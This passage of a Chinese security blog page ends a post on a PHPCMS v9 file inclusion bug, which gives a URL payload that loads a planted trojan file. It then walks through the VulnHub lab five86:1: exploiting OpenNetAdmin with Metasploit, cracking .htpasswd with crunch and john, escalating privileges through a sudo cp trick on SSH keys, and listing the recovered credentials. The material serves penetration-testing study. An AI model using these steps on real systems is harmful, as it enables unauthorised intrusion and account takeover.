<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> template(<span class="string">'link'</span>, <span class="string">'register'</span>);</span><br></pre></td></tr></table></figure>

<p>跟进template()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'content'</span>, $template = <span class="string">'index'</span>, $style = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(strpos($module, <span class="string">'plugin/'</span>)!== <span class="keyword">false</span>) &#123;</span><br><span class="line">		$plugin = str_replace(<span class="string">'plugin/'</span>, <span class="string">''</span>, $module);</span><br><span class="line">		<span class="keyword">return</span> p_template($plugin, $template,$style);</span><br><span class="line">	&#125;</span><br><span class="line">	$module = str_replace(<span class="string">'/'</span>, DIRECTORY_SEPARATOR, $module);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($style) &amp;&amp; preg_match(<span class="string">'/([a-z0-9\-_]+)/is'</span>,$style)) &#123;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="keyword">empty</span>($style) &amp;&amp; !defined(<span class="string">'STYLE'</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span>(defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">		</span><br><span class="line">		.....</span><br><span class="line">		.....</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"123"</span>;</span><br><span class="line">	var_dump($compiledtplfile);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"123"</span>;</span><br><span class="line">	<span class="keyword">return</span> $compiledtplfile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//14.png" alt="1580725647023"></p>
<p>可以把这个路径打印出来看看是怎么回事</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=link&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//15.png" alt="1580725784534"></p>
<p>然后跟进register.php</p>
<p><img src="/.com//16.png" alt="1580725858654"></p>
<p>发现这里会调用pc_tag(),<strong>当然也可以全局搜索,然后来看看哪里调用了pc_tag()</strong></p>
<p>既然调用了pc_tag(),那么木马文件就会被读取</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=link&amp;c=index&amp;a=register&amp;siteid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//17.png" alt="1580726010375"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好多之前没有懂的东西,都懂了.炒冷饭现场…….</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5k50019kou56lxcfpn3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-five86-1-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/03/five86-1-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-03T06:00:21.000Z" itemprop="datePublished">2020-02-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/03/five86-1-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">five86:1-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机：<code>vulnhub-five86:1</code></p>
<p>靶机<code>IP</code>: 192.168.0.117</p>
<p>攻击机<code>IP</code>:192.168.0.9</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><code>nmap</code>扫描端口</p>
<p><img src="/.com//1.png" alt="image-20200201235027078"></p>
<p>先看80端口，还有10000端口。</p>
<p>10000端口上运行着<code>Webmin</code>，看一下版本，这个是<code>CVE-2019-151017</code>。</p>
<p>但是测试结果发现是不行的。</p>
<p>所以把重心放在了80端口上，这个端口访问<code>robots.txt</code>,在<code>/ona</code>上运行着<code>opennetadmin</code></p>
<p><img src="/.com//2.png" alt="image-20200202000332522"></p>
<p>查一下这个<code>webapp</code>有什么漏洞</p>
<p><img src="/.com//3.png" alt="image-20200202000800071"></p>
<p>利用这个<code>exp</code>，由于这个exp在<code>msf</code>中是没有的，所以我们得下载一下才可以。</p>
<p>利用<code>47772.rb</code></p>
<p><strong>注:有的exp可能是在windows上编写的，比如一些<code>sh</code>，或者<code>rb</code>文件，所以我们得先用<code>dos2unix</code>转换一下</strong></p>
<p>然后把<code>rb</code>文件复制到<code>usr/share/metasploit-framework/modules/exploits</code>文件夹下，并给定合适的权限。</p>
<p><img src="/.com//4.png" alt="image-20200202001517862"></p>
<p><code>getshell</code>成功。</p>
<p><img src="/.com//5.png" alt="image-20200202001750795"></p>
<p>获得tty，访问<code>/var/www</code>，可以找到隐藏文件<code>.htpasswd</code></p>
<p><img src="/.com//6.png" alt="image-20200202002043605"></p>
<p>查看<code>/etc/passwd</code>，刚好有一个<code>douglas</code>用户。</p>
<p><img src="/.com//7.png" alt="image-20200202002455218"></p>
<p>于是解密<code>.htpasswd</code></p>
<p>根据提示是有十个给定字符组成的密码，生成字典</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch <span class="number">10</span> <span class="number">10</span> aefhrt -o <span class="number">2.</span>txt</span><br></pre></td></tr></table></figure>

<p>然后用<code>john</code>爆破</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlists=<span class="number">2.</span>txt test</span><br></pre></td></tr></table></figure>

<p>爆破获得密码为<code>fatherrrrr</code></p>
<p>然后<code>ssh</code>连接</p>
<p><img src="/.com//8.png" alt="image-20200202003223588"></p>
<p><code>sudo -l</code>查看可知，这里的<code>jen</code>用户是可以使用</p>
<p><img src="/.com//9.png" alt="image-20200202003520855"></p>
<p><strong>划重点，为了能连接上jen，为了使用jen用户，复制douglas的key到jen用户下,因为对jen来说,无用户验证,就可以使用的命令就是cp.</strong>，命令如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen –t rsa –C “jen@five86<span class="number">-1</span>”</span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line">cd /tmp</span><br><span class="line">chmod <span class="number">777</span> authorized_keys</span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br></pre></td></tr></table></figure>

<p>你品，你细品。</p>
<p>然后ssh连接上<code>jen</code>用户</p>
<p><img src="/.com//10.png" alt="image-20200202004401619"></p>
<p>有封邮件，访问<code>/var/mail</code></p>
<p><img src="/.com//11.png" alt="image-20200202004515131"></p>
<p>获得<code>moss:Fire!Fire!</code></p>
<p><img src="/.com//12.png" alt="image-20200202004619787"></p>
<p><img src="/.com//14.png" alt="image-20200202010037990"></p>
<p>最终getshell</p>
<p><img src="/.com//13.png" alt="image-20200202005828374"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用<code>jen</code>用户，复制<code>douglas</code>的key到<code>jen</code>用户下</p>
<p>细品</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/03/five86-1-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5jm000vkou52yzv9djx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
          </li>
        
          <li>
            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
          </li>
        
          <li>
            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
          </li>
        
          <li>
            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>